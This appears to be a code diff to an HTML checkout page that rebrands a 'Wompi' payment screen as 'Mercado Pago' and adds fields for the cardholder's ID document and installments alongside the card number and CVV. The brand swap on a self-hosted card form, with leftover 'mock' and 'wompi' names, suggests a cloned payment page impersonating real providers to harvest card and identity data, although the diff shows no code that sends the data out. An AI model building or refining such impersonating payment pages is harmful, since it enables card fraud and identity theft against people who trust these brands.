@@ -3,12 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Wompi - Pasarela de Pagos</title>
+  <title>Mercado Pago - Pasarela de Pagos</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
     body { background: #fff; color: #333; min-height: 100vh; }
-    .mock-header { background: #000; height: 40px; }
+    .mock-header { background: #009ee3; height: 50px; display: flex; align-items: center; justify-content: flex-end; padding: 0 15px; }
+    .close-btn { color: white; background: none; border: none; font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
     .container { padding: 20px; max-width: 500px; margin: 0 auto; }
 
     .commerce-info { display: flex; justify-content: center; margin-bottom: 20px; }
@@ -68,7 +69,11 @@
   </style>
 </head>
 <body>
-  <div class="mock-header"></div>
+  <div class="mock-header">
+    <button class="close-btn" onclick="window.location.href='/'" aria-label="Cerrar">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+    </button>
+  </div>
 
   <div id="payment-flow" class="container">
 
@@ -138,6 +143,30 @@
           <label>Código de seguridad</label>
           <input type="text" class="form-input" id="card-cvv" placeholder="CVC" maxlength="4" autocomplete="cc-csc" inputmode="numeric">
         </div>
+      </div>
+      <div class="form-group">
+        <label>Documento del titular</label>
+        <div style="display: flex; gap: 10px;">
+          <select class="form-input" id="doc-type" style="width: 30%;">
+            <option value="CC">CC</option>
+            <option value="CE">CE</option>
+            <option value="NIT">NIT</option>
+            <option value="Pasaporte">Pasaporte</option>
+          </select>
+          <input type="text" class="form-input" id="doc-number" placeholder="Ingresa el número" style="width: 70%;" inputmode="numeric">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>¿En cuántas cuotas deseas pagar?</label>
+        <select class="form-input" id="card-installments">
+          <option value="1">1</option>
+          <option value="2">2</option>
+          <option value="3">3</option>
+          <option value="6">6</option>
+          <option value="12">12</option>
+          <option value="24">24</option>
+          <option value="36">36</option>
+        </select>
       </div>
       <button class="btn-pay-card" id="btn-pay-card" onclick="submitCardPayment()">
         <span class="btn-spinner" id="card-spinner"></span>
@@ -242,8 +271,8 @@
     </div>
 
     <div class="wompi-footer">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="#777"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-      PAGOS SEGUROS POR &nbsp;<strong style="font-size:17px; letter-spacing:-0.5px; color:#111;">🇼 Wompi</strong>
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#009ee3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+      PAGOS SEGUROS POR &nbsp;<strong style="font-size:17px; letter-spacing:-0.5px; color:#009ee3;">Mercado Pago</strong>
     </div>
   </div>
 
@@ -410,6 +439,9 @@
         return;
       }
       if (cvv.length < 3) { alert('Ingresa el código de seguridad (3 o 4 dígitos).'); return; }
+
+      const docNumber = document.getElementById('doc-number').value.trim();
+      if (!docNumber) { alert('Ingresa el documento del titular.'); return; }
 
       const brand = detectCardBrand(number);
       const btn = document.getElementById('btn-pay-card');
